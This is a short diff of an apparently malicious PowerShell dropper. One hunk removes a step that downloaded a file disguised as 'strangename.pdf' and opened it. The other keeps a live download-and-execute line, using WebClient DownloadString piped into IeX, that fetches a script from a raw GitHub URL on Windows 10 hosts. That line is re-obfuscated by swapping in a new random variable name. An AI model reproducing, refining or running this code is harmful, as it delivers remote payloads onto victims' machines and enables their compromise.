@@ -45,9 +45,9 @@ $ishscjsof='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib20
 
 
 
-$path= $env:USERPROFILE + "\Downloads\strangename.pdf"
-(New-Object System.Net.WebClient).DownloadFile($lwoxheihwic,$path)
-Start-Process -F $path
+#
+#
+#
 
 
 
@@ -68,7 +68,7 @@ if ($OSVersion -match "7")
         
             if ($OSVersion -match "10")
             {
-                $DeXRxeNy = (new-object net.webclient); IeX ($DeXRxeNy.downloadstring($ishscjsof))
+                $aujyJdVsDBw = (new-object net.webclient); IeX ($aujyJdVsDBw.downloadstring($ishscjsof))
             }
 
 
